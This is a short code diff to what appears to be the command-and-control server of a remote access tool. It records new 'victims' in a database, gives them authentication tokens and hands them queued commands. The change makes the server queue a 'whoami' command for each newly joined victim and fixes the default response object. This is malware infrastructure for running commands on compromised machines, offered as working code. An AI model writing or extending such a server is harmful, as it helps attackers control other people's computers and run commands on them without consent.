@@ -26,7 +26,19 @@ async function initialHandshake(req, res) {
 		await record
 			.save()
 			.then(async () => {
-				console.log("New victim joined !");
+				console.info("New victim joined with id: " + record._id);
+				const firstPlaceholderCmd = new mongodb.VictimCommands({
+					victimId: record._id,
+					command: "whoami",
+					active: true,
+				});
+				
+				await firstPlaceholderCmd.save().then(() => {
+					console.info("saved placeholder cmd for victim: " + record._id)
+				}).catch((err) => {
+					console.error("failed to save placeholder cmd for victim: " + record._id);
+				})
+
 				const RefreshToken = await authMiddleware.generateRefreshToken(
 					record._id,
 					"victim",
@@ -56,7 +68,7 @@ async function getCmd(req, res) {
 		.limit(1) // Limit the result to 1 record (the latest one)
 		.exec();
 	
-	let obj;
+	let obj = {};
 
 	if (victimCmdList.length > 0) {
 		const latestCmd = victimCmdList[0];
